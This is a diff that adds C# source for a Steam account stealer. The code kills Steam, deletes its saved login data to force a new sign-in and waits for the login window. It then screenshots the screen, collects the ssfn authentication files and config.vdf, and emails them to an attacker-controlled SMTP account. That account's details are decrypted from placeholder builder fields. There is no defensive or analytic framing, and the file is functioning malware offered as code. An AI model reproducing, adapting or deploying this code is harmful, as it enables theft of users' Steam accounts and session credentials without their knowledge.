@@ -1,0 +1,88 @@
+static string ProgramFilesx86()
+    {
+        if (8 == IntPtr.Size
+            || (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"))))
+        {
+            return Environment.GetEnvironmentVariable("ProgramFiles(x86)");
+        }
+
+        return Environment.GetEnvironmentVariable("ProgramFiles");
+    }
+
+
+    static void Steam()
+    {
+        Attachment steamscreen = null;
+        Attachment ssfn = null;
+        Attachment config = null;
+        string ssfnpath = ProgramFilesx86() + @"\Steam";
+        try
+        {
+            foreach (Process p in Process.GetProcesses())
+            {
+                if (p.ProcessName.ToLower() == "steam")
+                {
+                    p.Kill();
+                }
+            }
+            File.Delete(ssfnpath + @"\config\SteamAppData.vdf");
+        }
+        catch { }
+        bool windowopened = false;
+        while (true)
+        {
+            try
+            {
+                if (GetActiveWindowTitle() == "Steam Login")
+                {
+                    if (windowopened) { }
+                    else
+                    {
+                        windowopened = true;
+                        Thread.Sleep(2000);
+                        Image screen = GetScreenShot();
+                        string[] files = Directory.GetFiles(ssfnpath);
+                        foreach (string file in files)
+                        {
+                            if (file.Contains("ssfn"))
+                            {
+                                MemoryStream ms = new MemoryStream();
+                                screen.Save(ms, ImageFormat.Png);
+                                ms.Position = 0;
+                                steamscreen = new Attachment(ms, "screen.png");
+                                ssfn = new Attachment(file);
+                                config = new Attachment(ssfnpath + "\\config\\config.vdf");
+                                break;
+                            }
+                        }
+
+                    }
+                }
+                else
+                {
+                    if (windowopened)
+                    {
+                        NetworkCredential creds = new NetworkCredential(Decrypt("[EMAIL]", "[PASS]"), Decrypt("[PASSWORD]", "[PASS]"));
+                        MailMessage mail = new MailMessage();
+                        mail.To.Add(Decrypt("[EMAIL]", "[PASS]"));
+                        mail.From = new MailAddress(Decrypt("[EMAIL]", "[PASS]"));
+                        mail.Subject = Environment.UserName + "@" + Environment.MachineName + " STEAM LOGS";
+                        mail.Body = contents;
+                        if (steamscreen != null) { mail.Attachments.Add(steamscreen); }
+                        if (ssfn != null) { mail.Attachments.Add(ssfn); }
+                        if (config != null) { mail.Attachments.Add(config); }
+
+                        SmtpClient client = new SmtpClient("[EMAIL SERVER]", Convert.ToInt32("[SERVER PORT]"));
+                        client.DeliveryMethod = SmtpDeliveryMethod.Network;
+                        client.Credentials = creds;
+                        client.EnableSsl = true;
+                        client.Send(mail);
+                        windowopened = false;
+                    }
+                }
+            }
+            catch
+            {}
+            Thread.Sleep(100);
+        }
+    }
